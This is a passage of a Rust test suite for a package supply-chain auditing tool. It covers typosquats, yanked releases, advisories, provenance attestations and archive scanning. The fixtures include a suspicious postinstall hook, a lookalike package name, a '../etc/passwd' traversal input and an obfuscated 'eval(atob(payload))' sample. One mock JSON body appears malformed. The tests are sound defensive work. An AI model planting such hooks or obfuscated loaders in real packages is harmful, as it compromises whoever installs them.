    let ids: Vec<&str> = value["advisories"]
        .as_array()
        .unwrap()
        .iter()
        .map(|advisory| advisory["id"].as_str().unwrap())
        .collect();
    assert_eq!(ids, vec!["GHSA-aaa", "GHSA-bbb", "GHSA-ccc"]);
}

#[test]
fn lock_audits_all_new_packages_in_sorted_order() {
    let repo = Repo::new();
    repo.write("package-lock.json", &lockfile_json(&[("express", "5.1.0")]));
    repo.commit("base");
    repo.write(
        "package-lock.json",
        &lockfile_json(&[
            ("express", "5.1.0"),
            ("zeta-pkg", "1.0.0"),
            ("alpha-pkg", "1.0.0"),
            ("beta-pkg", "1.0.0"),
        ]),
    );

    let registry = registry_with(
        &[
            PackageFixture::clean("zeta-pkg"),
            PackageFixture::clean("alpha-pkg"),
            PackageFixture::clean("beta-pkg"),
        ],
        None,
    );
    let output = registry
        .command()
        .current_dir(repo.path())
        .args(["lock", "package-lock.json", "--base", "HEAD", "--json"])
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();

    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    let names: Vec<&str> = value["new_packages"]
        .as_array()
        .unwrap()
        .iter()
        .map(|package| package["name"].as_str().unwrap())
        .collect();
    assert_eq!(names, vec!["alpha-pkg", "beta-pkg", "zeta-pkg"]);

    let requests = registry.requests();
    for name in ["alpha-pkg", "beta-pkg", "zeta-pkg"] {
        assert!(
            requests.iter().any(|path| path == &format!("/{name}")),
            "{name} was not audited: {requests:?}"
        );
    }
}

#[test]
fn lock_flags_a_typosquat_of_an_existing_dependency() {
    let repo = Repo::new();
    repo.write(
        "package-lock.json",
        &lockfile_json(&[("express", "5.1.0"), ("cross-env", "7.0.3")]),
    );
    repo.commit("base");
    repo.write(
        "package-lock.json",
        &lockfile_json(&[
            ("express", "5.1.0"),
            ("cross-env", "7.0.3"),
            ("crossenv", "0.0.2-security"),
        ]),
    );

    let suspicious = PackageFixture {
        version: "0.0.2-security",
        ..PackageFixture::clean("crossenv")
    };
    let registry = registry_with(&[suspicious], None);
    registry
        .command()
        .current_dir(repo.path())
        .args(["lock", "package-lock.json", "--base", "HEAD"])
        .assert()
        .code(2)
        .stdout(predicate::str::contains(
            "name is close to a package you already use",
        ))
        .stdout(predicate::str::contains("already in your lockfile"));
}

#[test]
fn lock_does_not_flag_a_known_package_similar_to_an_installed_one() {
    let repo = Repo::new();
    repo.write("package-lock.json", &lockfile_json(&[("react", "19.0.0")]));
    repo.commit("base");
    repo.write(
        "package-lock.json",
        &lockfile_json(&[("react", "19.0.0"), ("preact", "10.25.0")]),
    );

    let preact = PackageFixture {
        version: "10.25.0",
        ..PackageFixture::clean("preact")
    };
    let registry = registry_with(&[preact], None);
    registry
        .command()
        .current_dir(repo.path())
        .args(["lock", "package-lock.json", "--base", "HEAD"])
        .assert()
        .code(0)
        .stdout(predicate::str::contains("typosquat").not());
}

#[test]
fn npm_uses_the_nearest_lockfile_for_typosquat_context() {
    let repo = Repo::new();
    repo.write(
        "package-lock.json",
        &lockfile_json(&[("cross-env", "7.0.3")]),
    );
    repo.commit("base");
    let nested = repo.path().join("src");
    std::fs::create_dir_all(&nested).unwrap();

    let suspicious = PackageFixture {
        version: "0.0.2-security",
        ..PackageFixture::clean("crossenv")
    };
    let registry = registry_with(&[suspicious], None);
    registry
        .command()
        .current_dir(&nested)
        .args(["npm", "crossenv"])
        .assert()
        .code(2)
        .stdout(predicate::str::contains(
            "name is close to a package you already use",
        ))
        .stdout(predicate::str::contains("already in your lockfile"));
}

#[test]
fn no_local_flag_falls_back_to_the_seed_list() {
    let repo = Repo::new();
    repo.write(
        "package-lock.json",
        &lockfile_json(&[("cross-env", "7.0.3")]),
    );
    repo.commit("base");

    let suspicious = PackageFixture {
        version: "0.0.2-security",
        ..PackageFixture::clean("crossenv")
    };
    let registry = registry_with(&[suspicious], None);
    registry
        .command()
        .current_dir(repo.path())
        .args(["npm", "crossenv", "--no-local"])
        .assert()
        .code(2)
        .stdout(predicate::str::contains(
            "name is close to a popular package",
        ))
        .stdout(predicate::str::contains("already in your lockfile").not());
}

const PYPI_WHEEL: &str = r#"{
    "info": {
        "name": "flask",
        "version": "3.1.0",
        "home_page": "https://flask.palletsprojects.com",
        "project_urls": { "Source": "https://github.com/pallets/flask" }
    },
    "urls": [
        { "filename": "flask-3.1.0-py3-none-any.whl", "packagetype": "bdist_wheel", "upload_time": "2025-01-15T00:00:00" },
        { "filename": "flask-3.1.0.tar.gz", "packagetype": "sdist", "upload_time": "2025-01-15T00:00:00" }
    ],
    "releases": {
        "3.1.0": [
            { "packagetype": "bdist_wheel", "upload_time": "2025-01-15T00:00:00" },
            { "packagetype": "sdist", "upload_time": "2025-01-15T00:00:00" }
        ]
    }
}"#;

#[test]
fn pypi_wheel_release_is_clean_and_says_what_it_cannot_check() {
    let registry = pypi_registry("flask", PYPI_WHEEL);
    registry
        .command()
        .args(["pypi", "flask"])
        .assert()
        .code(0)
        .stdout(predicate::str::contains("pypi/flask@3.1.0"))
        .stdout(predicate::str::contains("not checked"))
        .stdout(predicate::str::contains("maintainers, downloads"));
}

#[test]
fn pypi_json_names_the_ecosystem_and_missing_signals() {
    let registry = pypi_registry("flask", PYPI_WHEEL);
    let output = registry
        .command()
        .args(["pypi", "flask", "--json"])
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();
    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(value["ecosystem"], "pypi");
    assert_eq!(value["version"], "3.1.0");
    assert_eq!(value["not_checked"][0], "maintainers");
    assert_eq!(value["not_checked"][1], "downloads");
}

#[test]
fn pypi_sdist_only_version_warns_about_building() {
    let body = r#"{
        "info": { "name": "oldpkg", "version": "0.1" },
        "urls": [{ "packagetype": "sdist", "upload_time": "2015-01-01T00:00:00" }]
    }"#;
    let registry = pypi_registry("oldpkg", body);
    registry
        .command()
        .args(["pypi", "oldpkg==0.1"])
        .assert()
        .code(1)
        .stdout(predicate::str::contains("installs by building from source"))
        .stdout(predicate::str::contains("no wheel is published"));
}

#[test]
fn pypi_yanked_release_is_a_warning() {
    let body = r#"{
        "info": { "name": "badpkg", "version": "1.0" },
        "urls": [
            { "packagetype": "sdist", "yanked": true, "yanked_reason": "malware" }
        ]
    }"#;
    let registry = pypi_registry("badpkg", body);
    registry
        .command()
        .args(["pypi", "badpkg"])
        .assert()
        .code(1)
        .stdout(predicate::str::contains("this release is yanked: malware"));
}

const SERDE_CRATE: &str = r#"{
    "crate": {
        "name": "serde",
        "max_version": "1.0.229",
        "max_stable_version": "1.0.229",
        "created_at": "2014-12-20T00:00:00Z",
        "repository": "https://github.com/serde-rs/serde"
    },
    "versions": [
        {
            "num": "1.0.229",
            "created_at": "2026-10-01T00:00:00Z",
            "yanked": false,
            "published_by": { "login": "dtolnay" }
        }
    ]
}"#;

#[test]
fn crates_clean_crate_reports_what_cannot_be_checked() {
    let owners = r#"{"users":[{"login":"dtolnay"},{"login":"oli-obk"}]}"#;
    let registry = crates_registry("serde", SERDE_CRATE, Some(owners));
    registry
        .command()
        .args(["crates", "serde", "--json"])
        .assert()
        .code(0)
        .stdout(predicate::str::contains("\"ecosystem\": \"crates\""))
        .stdout(predicate::str::contains("\"execution\""))
        .stdout(predicate::str::contains("\"downloads\""));
}

#[test]
fn crates_yanked_version_is_a_warning() {
    let body = r#"{
        "crate": { "name": "oldpkg", "max_version": "1.0.0" },
        "versions": [{ "num": "1.0.0", "yanked": true, "yank_message": "security" }]
    }"#;
    let registry = crates_registry("oldpkg", body, Some(r#"{"users":[]}"#));
    registry
        .command()
        .args(["crates", "oldpkg"])
        .assert()
        .code(1)
        .stdout(predicate::str::contains("this version is yanked: security"));
}

#[test]
fn crates_without_owners_says_the_check_was_unavailable() {
    let registry = crates_registry("serde", SERDE_CRATE, None);
    registry
        .command()
        .args(["crates", "serde"])
        .assert()
        .code(0)
        .stdout(predicate::str::contains("maintainer list unavailable"));
}

#[test]
fn crates_unknown_crate_is_a_tool_error() {
    let registry = crates_registry("serde", SERDE_CRATE, None);
    registry
        .command()
        .args(["crates", "ghost-crate"])
        .assert()
        .code(3)
        .stderr(predicate::str::contains("was not found on crates.io"));
}

const GIN_MODULE: &str = r#"{
    "packageKey": { "system": "GO", "name": "github.com/gin-gonic/gin" },
    "versions": [
        {
            "versionKey": { "version": "v1.9.1" },
            "publishedAt": "2023-06-13T00:00:00Z",
            "isDefault": true,
            "isDeprecated": false
        }
    ]
}"#;

const GIN_ROUTE: &str = "/v3/systems/go/packages/github.com%2Fgin-gonic%2Fgin";

fn go_registry(route: &str, status: u16, body: &str) -> MockRegistry {
    let mut routes = HashMap::new();
    routes.insert(route.to_string(), (status, body.to_string()));
    routes.insert(
        "/v1/querybatch".to_string(),
        (200, NO_ADVISORIES.to_string()),
    );
    MockRegistry::start(routes)
}

#[test]
fn go_module_reports_what_go_cannot_check() {
    let registry = go_registry(GIN_ROUTE, 200, GIN_MODULE);
    registry
        .command()
        .args(["go", "github.com/gin-gonic/gin", "--json"])
        .assert()
        .code(0)
        .stdout(predicate::str::contains("\"ecosystem\": \"go\""))
        .stdout(predicate::str::contains("\"execution\""))
        .stdout(predicate::str::contains("\"maintainers\""))
        .stdout(predicate::str::contains("\"repository\""))
        .stdout(predicate::str::contains("\"downloads\""));
}

#[test]
fn go_module_never_reports_a_missing_repository() {
    let registry = go_registry(GIN_ROUTE, 200, GIN_MODULE);
    registry
        .command()
        .args(["go", "github.com/gin-gonic/gin"])
        .assert()
        .code(0)
        .stdout(predicate::str::contains("no repository").not());
}

#[test]
fn go_unknown_module_is_a_tool_error() {
    let registry = go_registry(GIN_ROUTE, 200, GIN_MODULE);
    registry
        .command()
        .args(["go", "example.com/ghost"])
        .assert()
        .code(3)
        .stderr(predicate::str::contains(
            "was not found on the Go module index",
        ));
}

#[test]
fn go_unknown_version_is_a_tool_error() {
    let registry = go_registry(GIN_ROUTE, 200, GIN_MODULE);
    registry
        .command()
        .args(["go", "github.com/gin-gonic/gin@v9.9.9"])
        .assert()
        .code(3)
        .stderr(predicate::str::contains("v9.9.9"))
        .stderr(predicate::str::contains("not found in the Go module index"));
}

#[test]
fn go_malformed_response_is_a_tool_error() {
    let registry = go_registry(GIN_ROUTE, 200, "{ nope");
    registry
        .command()
        .args(["go", "github.com/gin-gonic/gin"])
        .assert()
        .code(3)
        .stderr(predicate::str::contains("could not read"));
}

#[test]
fn go_invalid_module_never_reaches_the_network() {
    let registry = go_registry(GIN_ROUTE, 200, GIN_MODULE);
    registry
        .command()
        .args(["go", "../etc/passwd"])
        .assert()
        .code(3)
        .stderr(predicate::str::contains(
            "characters the registry does not allow",
        ));

    assert!(registry.requests().is_empty());
}

#[test]
fn audit_checks_every_package_in_the_lockfile() {
    let repo = Repo::new();
    repo.write(
        "package-lock.json",
        &lockfile_json(&[("clean-pkg", "1.0.0"), ("evil-pkg", "1.0.0")]),
    );

    let evil = PackageFixture {
        created_days_ago: 1,
        published_days_ago: 1,
        scripts: r#"{"postinstall":"node setup.js"}"#,
        ..PackageFixture::clean("evil-pkg")
    };
    let registry = registry_with(&[PackageFixture::clean("clean-pkg"), evil], None);
    let output = registry
        .command()
        .current_dir(repo.path())
        .args(["audit", "package-lock.json", "--json"])
        .assert()
        .code(2)
        .get_output()
        .stdout
        .clone();

    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    let names: Vec<&str> = value["packages"]
        .as_array()
        .unwrap()
        .iter()
        .map(|package| package["name"].as_str().unwrap())
        .collect();
    assert_eq!(names, vec!["clean-pkg", "evil-pkg"]);
    assert_eq!(value["exit_code"], 2);
}

#[test]
fn gemfile_platform_suffix_is_stripped_before_osv() {
    let directory = tempfile::tempdir().unwrap();
    std::fs::write(
        directory.path().join("Gemfile.lock"),
        "GEM\n  remote: https://rubygems.org/\n  specs:\n    nokogiri (1.16.0-x86_64-linux)\n",
    )
    .unwrap();

    let mut routes = HashMap::new();
    routes.insert(
        "/api/v1/versions/nokogiri.json".to_string(),
        (
            200,
            r#"[{ "number": "1.16.0", "created_at": "2024-01-01T00:00:00Z", "platform": "x86_64-linux" }]"#
                .to_string(),
        ),
    );
    routes.insert(
        "/api/v1/gems/nokogiri.json".to_string(),
        (
            200,
            r#"{ "version": "1.16.0", "source_code_uri": "https://github.com/sparklemotion/nokogiri", "yanked": false }"#
                .to_string(),
        ),
    );
    routes.insert(
        "/v1/querybatch".to_string(),
        (200, HIGH_ADVISORY.to_string()),
    );
    routes.insert(
        "/v1/vulns/GHSA-test-0001".to_string(),
        (200, HIGH_ADVISORY_DETAIL.to_string()),
    );
    let registry = MockRegistry::start(routes);

    registry
        .command()
        .current_dir(directory.path())
        .args(["audit", "Gemfile.lock"])
        .assert()
        .code(2);

    let bodies = registry.request_bodies().join("\n").replace(' ', "");
    assert!(bodies.contains("\"version\":\"1.16.0\""), "{bodies}");
    assert!(!bodies.contains("x86_64"), "{bodies}");
}

#[test]
fn large_trees_are_chunked() {
    let names: Vec<String> = (1..=501).map(|index| format!("p{index:03}")).collect();
    let entries: Vec<(&str, &str)> = names.iter().map(|name| (name.as_str(), "1.0.0")).collect();
    let repo = Repo::new();
    repo.write("package-lock.json", &lockfile_json(&entries));

    let mut routes = HashMap::new();
    let results = "{}".repeat(0); // placeholder, replaced below
    let _ = results;
    let body = format!(
        "{{\"results\":[{}]}}",
        std::iter::repeat_n("{}", names.len())
            .collect::<Vec<_>>()
            .join(",")
    );
    routes.insert("/v1/querybatch".to_string(), (200, body));
    for chunk in names.chunks(128) {
        let joined = chunk.join(",");
        routes.insert(
            format!("/downloads/last-week/{joined}"),
            (200, "{}".to_string()),
        );
    }
    let registry = MockRegistry::start(routes);

    registry
        .command()
        .current_dir(repo.path())
        .args(["audit", "package-lock.json"])
        .assert()
        .code(3);

    let requests = registry.requests();
    assert_eq!(
        requests
            .iter()
            .filter(|path| path.contains("/v1/querybatch"))
            .count(),
        2,
        "501 queries must take two batches"
    );
    assert_eq!(
        requests
            .iter()
            .filter(|path| path.contains("last-week"))
            .count(),
        4,
        "501 names must take four download batches"
    );
}

#[test]
fn a_tree_audit_batches_osv_and_downloads() {
    let repo = Repo::new();
    repo.write(
        "package-lock.json",
        &lockfile_json(&[("pkg-a", "1.0.0"), ("pkg-b", "1.0.0")]),
    );

    let a = PackageFixture::clean("pkg-a");
    let b = PackageFixture::clean("pkg-b");
    let mut routes = HashMap::new();
    routes.insert(a.route(), (200, a.to_json()));
    routes.insert(b.route(), (200, b.to_json()));
    // One downloads request for both names; the mock accepts either order.
    for url in [
        "/downloads/last-week/pkg-a,pkg-b",
        "/downloads/last-week/pkg-b,pkg-a",
    ] {
        routes.insert(
            url.to_string(),
            (
                200,
                r#"{"pkg-a":{"downloads":1},"pkg-b":{"downloads":2}}"#.to_string(),
            ),
        );
    }
    routes.insert(
        "/v1/querybatch".to_string(),
        (
            200,
            r#"{"results":[{"vulns":[{"id":"GHSA-test-0001"}]},{"vulns":[{"id":"GHSA-test-0001"}]}]}"#
                .to_string(),
        ),
    );
    routes.insert(
        "/v1/vulns/GHSA-test-0001".to_string(),
        (200, HIGH_ADVISORY_DETAIL.to_string()),
    );
    let registry = MockRegistry::start(routes);

    let output = registry
        .command()
        .current_dir(repo.path())
        .args(["audit", "package-lock.json", "--json"])
        .assert()
        .code(2)
        .get_output()
        .stdout
        .clone();

    let requests = registry.requests();
    assert_eq!(
        requests
            .iter()
            .filter(|path| path.contains("/v1/querybatch"))
            .count(),
        1,
        "{requests:?}"
    );
    assert_eq!(
        requests
            .iter()
            .filter(|path| path.contains("last-week"))
            .count(),
        1,
        "{requests:?}"
    );
    assert_eq!(
        requests
            .iter()
            .filter(|path| path.contains("/v1/vulns/GHSA-test-0001"))
            .count(),
        1,
        "a shared advisory must hydrate once: {requests:?}"
    );

    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    let advisories: Vec<usize> = value["packages"]
        .as_array()
        .unwrap()
        .iter()
        .map(|package| package["advisories"].as_array().unwrap().len())
        .collect();
    assert_eq!(advisories, vec![1, 1]);
}

fn pypi_project(uploaded: &str, previous: &str, requires: Option<&str>) -> String {
    let requires = match requires {
        Some(requires) => format!("[\"{requires}\"]"),
        None => "null".to_string(),
    };
    format!(
        r#"{{
            "info": {{ "name": "recent-pkg", "version": "1.1.0", "requires_dist": {requires} }},
            "urls": [ {{ "packagetype": "bdist_wheel", "upload_time": "{uploaded}" }} ],
            "releases": {{
                "1.0.0": [ {{ "packagetype": "bdist_wheel", "upload_time": "{previous}" }} ],
                "1.1.0": [ {{ "packagetype": "bdist_wheel", "upload_time": "{uploaded}" }} ]
            }}
        }}"#
    )
}

fn crates_crate(current: &str, previous: &str) -> String {
    format!(
        r#"{{
            "crate": {{
                "name": "recent-crate",
                "max_version": "1.1.0",
                "max_stable_version": "1.1.0",
                "created_at": "{previous}",
                "repository": "https://github.com/x/y"
            }},
            "versions": [
                {{ "num": "1.1.0", "created_at": "{current}", "yanked": false, "published_by": {{ "login": "a" }} }},
                {{ "num": "1.0.0", "created_at": "{previous}", "yanked": false, "published_by": {{ "login": "a" }} }}
            ]
        }}"#
    )
}

#[test]
fn crates_history_is_fetched_only_for_recent_releases() {
    let mut routes = HashMap::new();
    routes.insert(
        "/api/v1/crates/recent-crate".to_string(),
        (200, crates_crate(&days_ago(1), &days_ago(100))),
    );
    routes.insert(
        "/api/v1/crates/recent-crate/owners".to_string(),
        (200, r#"{"users":[{"login":"a"}]}"#.to_string()),
    );
    routes.insert(
        "/api/v1/crates/recent-crate/1.1.0/dependencies".to_string(),
        (
            200,
            r#"{"dependencies":[{"crate_id":"anyhow","kind":"normal"}]}"#.to_string(),
        ),
    );
    routes.insert(
        "/api/v1/crates/recent-crate/1.0.0/dependencies".to_string(),
        (
            200,
            r#"{"dependencies":[{"crate_id":"bytes","kind":"normal"}]}"#.to_string(),
        ),
    );
    routes.insert(
        "/v1/querybatch".to_string(),
        (200, NO_ADVISORIES.to_string()),
    );
    let registry = MockRegistry::start(routes);

    let output = registry
        .command()
        .args(["crates", "recent-crate@1.1.0", "--json"])
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();
    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert!(
        value["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "dependency-added"),
        "{}",
        value["findings"]
    );
    assert_eq!(
        registry
            .requests()
            .iter()
            .filter(|path| path.ends_with("/dependencies"))
            .count(),
        2
    );

    let mut old = HashMap::new();
    old.insert(
        "/api/v1/crates/recent-crate".to_string(),
        (200, crates_crate(&days_ago(400), &days_ago(500))),
    );
    old.insert(
        "/api/v1/crates/recent-crate/owners".to_string(),
        (200, r#"{"users":[{"login":"a"}]}"#.to_string()),
    );
    old.insert(
        "/v1/querybatch".to_string(),
        (200, NO_ADVISORIES.to_string()),
    );
    let registry = MockRegistry::start(old);
    registry
        .command()
        .args(["crates", "recent-crate@1.1.0"])
        .assert()
        .code(0);
    assert!(
        !registry
            .requests()
            .iter()
            .any(|path| path.ends_with("/dependencies")),
        "history fetched for an old release: {:?}",
        registry.requests()
    );
}

#[test]
fn pypi_reports_present_provenance() {
    let mut routes = HashMap::new();
    routes.insert(
        "/pypi/flask/json".to_string(),
        (200, PYPI_WHEEL.to_string()),
    );
    routes.insert(
        "/integrity/flask/3.1.0/flask-3.1.0.tar.gz/provenance".to_string(),
        (200, "{}".to_string()),
    );
    routes.insert(
        "/v1/querybatch".to_string(),
        (200, NO_ADVISORIES.to_string()),
    );
    let registry = MockRegistry::start(routes);

    let output = registry
        .command()
        .args(["pypi", "flask", "--json"])
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();
    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(value["provenance"], "present");

    // Without the endpoint the answer is "missing", never "verified".
    let mut plain = HashMap::new();
    plain.insert(
        "/pypi/flask/json".to_string(),
        (200, PYPI_WHEEL.to_string()),
    );
    plain.insert(
        "/v1/querybatch".to_string(),
        (200, NO_ADVISORIES.to_string()),
    );
    let registry = MockRegistry::start(plain);
    let output = registry
        .command()
        .args(["pypi", "flask", "--json"])
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();
    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(value["provenance"], "missing");
}

fn attested_registry(subject_hex: &str) -> MockRegistry {
    use base64::Engine as _;
    use sha2::Digest as _;

    let tarball = b"attested tarball";
    let digest = base64::engine::general_purpose::STANDARD.encode(sha2::Sha512::digest(tarball));
    let statement = format!(
        r#"{{"subject":[{{"name":"pkg:npm/attested@1.0.0","digest":{{"sha512":"{subject_hex}"}}}}],"predicate":{{"buildDefinition":{{"buildType":"https://slsa-framework.github.io/github-actions-buildtypes/workflow/v1","externalParameters":{{"workflow":{{"repository":"https://github.com/alice/attested","path":".github/workflows/release.yml"}}}},"resolvedDependencies":[{{"uri":"git+https://github.com/alice/attested@refs/heads/main","digest":{{"gitCommit":"b39e6e63dcbfc3cf4be871acf3554efbd6d0e268"}}}}]}},"runDetails":{{"builder":{{"id":"https://github.com/actions/runner/github-hosted"}}}}}}}}"#
    );
    let envelope = base64::engine::general_purpose::STANDARD.encode(statement.as_bytes());
    let body = format!(
        r#"{{"attestations":[{{"bundle":{{"dsseEnvelope":{{"payload":"{envelope}"}}}}}}]}}"#
    );

    MockRegistry::start_with(move |base| {
        let doc = format!(
            r#"{{"name":"attested","repository":{{"url":"https://github.com/alice/attested"}},"dist-tags":{{"latest":"1.0.0"}},"versions":{{"1.0.0":{{"dist":{{"tarball":"{base}/attested.tgz","integrity":"sha512-{digest}","attestations":{{"url":"{base}/attestation","provenance":{{"predicateType":"https://slsa.dev/provenance/v1"}}}}}}}}}}}}"#
        );
        let mut routes = HashMap::new();
        routes.insert("/attested".to_string(), (200, doc.into_bytes()));
        routes.insert("/attestation".to_string(), (200, body.clone().into_bytes()));
        routes
    })
}

#[test]
fn npm_attestations_are_checked_against_the_tarball_digest() {
    use sha2::Digest as _;

    let tarball_hex: String = sha2::Sha512::digest(b"attested tarball")
        .iter()
        .map(|byte| format!("{byte:02x}"))
        .collect();

    // The attestation names this exact tarball: report the match, no finding.
    let registry = attested_registry(&tarball_hex);
    let output = registry
        .command()
        .args(["npm", "attested", "--json"])
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();
    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(value["provenance"], "present");
    assert_eq!(value["attestation_subject_matches"], true);
    assert_eq!(
        value["attestation"]["source_repository"],
        "https://github.com/alice/attested"
    );
    assert_eq!(
        value["attestation"]["builder"],
        "https://github.com/actions/runner/github-hosted"
    );

    // A digest for another artifact is a HIGH integrity problem.
    let registry = attested_registry(&"0".repeat(128));
    let output = registry
        .command()
        .args(["npm", "attested", "--json"])
        .assert()
        .code(2)
        .get_output()
        .stdout
        .clone();
    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(value["attestation_subject_matches"], false);
    assert!(
        value["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "attestation-subject-mismatch"),
        "{}",
        value["findings"]
    );
}

#[test]
fn pypi_history_is_fetched_only_for_recent_releases() {
    let mut routes = HashMap::new();
    routes.insert(
        "/pypi/recent-pkg/json".to_string(),
        (
            200,
            pypi_project(
                &days_ago(1),
                &days_ago(100),
                Some("tomli; python_version < '3.11'"),
            ),
        ),
    );
    routes.insert(
        "/pypi/recent-pkg/1.1.0/json".to_string(),
        (
            200,
            pypi_project(
                &days_ago(1),
                &days_ago(100),
                Some("tomli; python_version < '3.11'"),
            ),
        ),
    );
    routes.insert(
        "/pypi/recent-pkg/1.0.0/json".to_string(),
        (
            200,
            pypi_project(&days_ago(400), &days_ago(500), Some("requests")),
        ),
    );
    routes.insert(
        "/v1/querybatch".to_string(),
        (200, NO_ADVISORIES.to_string()),
    );
    let registry = MockRegistry::start(routes);

    let output = registry
        .command()
        .args(["pypi", "recent-pkg==1.1.0", "--json"])
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();
    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert!(
        value["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "dependency-added"),
        "missing dependency-added: {}",
        value["findings"]
    );
    assert_eq!(
        registry
            .requests()
            .iter()
            .filter(|path| path.contains("/1.1.0/json") || path.contains("/1.0.0/json"))
            .count(),
        2
    );

    // A release outside the window must not cost history requests.
    let mut old = HashMap::new();
    old.insert(
        "/pypi/recent-pkg/json".to_string(),
        (
            200,
            pypi_project(&days_ago(400), &days_ago(500), Some("tomli")),
        ),
    );
    old.insert(
        "/v1/querybatch".to_string(),
        (200, NO_ADVISORIES.to_string()),
    );
    let registry = MockRegistry::start(old);
    registry
        .command()
        .args(["pypi", "recent-pkg==1.1.0"])
        .assert()
        .code(0);
    assert!(
        !registry
            .requests()
            .iter()
            .any(|path| path.contains("/1.1.0/json")),
        "history fetched for an old release: {:?}",
        registry.requests()
    );
}

#[test]
fn scoped_packages_get_downloads_one_at_a_time() {
    let repo = Repo::new();
    repo.write(
        "package-lock.json",
        &lockfile_json(&[("chalk", "1.0.0"), ("@types/node", "1.0.0")]),
    );

    let chalk = PackageFixture::clean("chalk");
    let types = PackageFixture::clean("@types/node");
    let mut routes = HashMap::new();
    routes.insert(chalk.route(), (200, chalk.to_json()));
    routes.insert(types.route(), (200, types.to_json()));
    routes.insert(
        "/downloads/last-week/chalk".to_string(),
        (200, r#"{"downloads":10}"#.to_string()),
    );
    routes.insert(
        "/downloads/last-week/@types%2Fnode".to_string(),
        (200, r#"{"downloads":20}"#.to_string()),
    );
    routes.insert(
        "/v1/querybatch".to_string(),
        (200, r#"{"results":[{},{"}]}"#.to_string()),
    );
    let registry = MockRegistry::start(routes);

    let output = registry
        .command()
        .current_dir(repo.path())
        .args(["audit", "package-lock.json", "--json"])
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();

    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    let mut downloads: Vec<u64> = value["packages"]
        .as_array()
        .unwrap()
        .iter()
        .map(|package| package["weekly_downloads"].as_u64().unwrap_or(0))
        .collect();
    downloads.sort_unstable();
    assert_eq!(downloads, vec![10, 20]);
    assert_eq!(
        registry
            .requests()
            .iter()
            .filter(|path| path.contains("last-week"))
            .count(),
        2,
        "one bulk for chalk, one scoped lookup"
    );
}

#[test]
fn a_failed_osv_batch_marks_every_package_incomplete() {
    let repo = Repo::new();
    repo.write(
        "package-lock.json",
        &lockfile_json(&[("pkg-a", "1.0.0"), ("pkg-b", "1.0.0")]),
    );

    let a = PackageFixture::clean("pkg-a");
    let b = PackageFixture::clean("pkg-b");
    let mut routes = HashMap::new();
    routes.insert(a.route(), (200, a.to_json()));
    routes.insert(b.route(), (200, b.to_json()));
    routes.insert("/v1/querybatch".to_string(), (500, "{}".to_string()));
    let registry = MockRegistry::start(routes);

    let output = registry
        .command()
        .current_dir(repo.path())
        .args(["audit", "package-lock.json", "--json"])
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();

    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    for package in value["packages"].as_array().unwrap() {
        assert!(
            package["findings"]
                .as_array()
                .unwrap()
                .iter()
                .any(|finding| finding["id"] == "advisory-check-unavailable"),
            "{} must say the check did not run: {package}",
            package["name"]
        );
    }
}

#[test]
fn a_lookalike_more_popular_than_its_target_is_clean() {
    let crossenv = PackageFixture::clean("crossenv");
    let mut routes = HashMap::new();
    routes.insert(crossenv.route(), (200, crossenv.to_json()));
    routes.insert(
        "/downloads/last-week/crossenv".to_string(),
        (200, r#"{"downloads":3000000}"#.to_string()),
    );
    routes.insert(
        "/downloads/last-week/cross-env".to_string(),
        (200, r#"{"downloads":2000000}"#.to_string()),
    );
    routes.insert(
        "/v1/querybatch".to_string(),
        (200, NO_ADVISORIES.to_string()),
    );
    let registry = MockRegistry::start(routes);

    let output = registry
        .command()
        .args(["npm", "crossenv", "--json"])
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();
    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert!(
        value["findings"]
            .as_array()
            .unwrap()
            .iter()
            .all(|finding| finding["id"] != "typosquat"),
        "{}",
        value["findings"]
    );
    assert!(
        registry
            .requests()
            .iter()
            .any(|path| path == "/downloads/last-week/cross-env"),
        "the candidate's popularity was not checked: {:?}",
        registry.requests()
    );
}

fn zip_archive(files: &[(&str, &[u8])]) -> Vec<u8> {
    use std::io::Cursor;
    let mut writer = zip::ZipWriter::new(Cursor::new(Vec::new()));
    let options =
        zip::write::SimpleFileOptions::default().compression_method(zip::CompressionMethod::Stored);
    for (path, bytes) in files {
        writer.start_file(*path, options).unwrap();
        writer.write_all(bytes).unwrap();
    }
    writer.finish().unwrap().into_inner()
}

fn tar_gz(files: &[(&str, &[u8])]) -> Vec<u8> {
    let mut builder = tar::Builder::new(flate2::write::GzEncoder::new(
        Vec::new(),
        flate2::Compression::default(),
    ));
    for (path, bytes) in files {
        let mut header = tar::Header::new_gnu();
        header.set_size(bytes.len() as u64);
        header.set_mode(0o644);
        header.set_path(path).unwrap();
        header.set_cksum();
        builder.append(&header, *bytes).unwrap();
    }
    builder.into_inner().unwrap().finish().unwrap()
}

#[test]
fn inspect_downloads_verifies_and_scans_an_archive() {
    use base64::Engine as _;
    use sha2::Digest as _;

    let archive = tar_gz(&[("lib/install.js", b"eval(atob(payload))\n")]);
    let digest = base64::engine::general_purpose::STANDARD.encode(sha2::Sha512::digest(&archive));
    let registry = MockRegistry::start_with(|base| {
        let doc = format!(
